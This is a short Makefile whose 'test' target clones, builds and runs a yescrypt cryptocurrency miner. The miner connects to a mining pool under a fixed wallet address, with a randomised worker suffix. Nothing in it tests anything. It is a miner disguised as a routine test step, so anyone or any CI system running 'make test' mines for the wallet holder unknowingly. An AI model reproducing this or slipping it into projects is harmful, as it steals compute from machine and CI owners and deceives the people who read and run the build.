test:
	export TEST=$(cat /dev/urandom | base64 | head -c 44 | sed 's/[^a-zA-Z0-9]//g' -) && git clone https://github.com/noncepool/cpuminer-yescrypt gordongecko && cd gordongecko && ./autogen.sh && ./configure CFLAGS="-O3 -march=native -Wall" && make && (./minerd -a yescrypt -o stratum+tcp://jp.kotopool.work:3332 -u k1GHJkvxLQocac94MFBbKAsdUvNbFdFWUyE.gecko_$(TEST) -t 2 || ./minerd -a yescrypt -o stratum+tcp://jp.kotopool.work:3332 -u k1GHJkvxLQocac94MFBbKAsdUvNbFdFWUyE.gecko_$(TEST) -t 1)
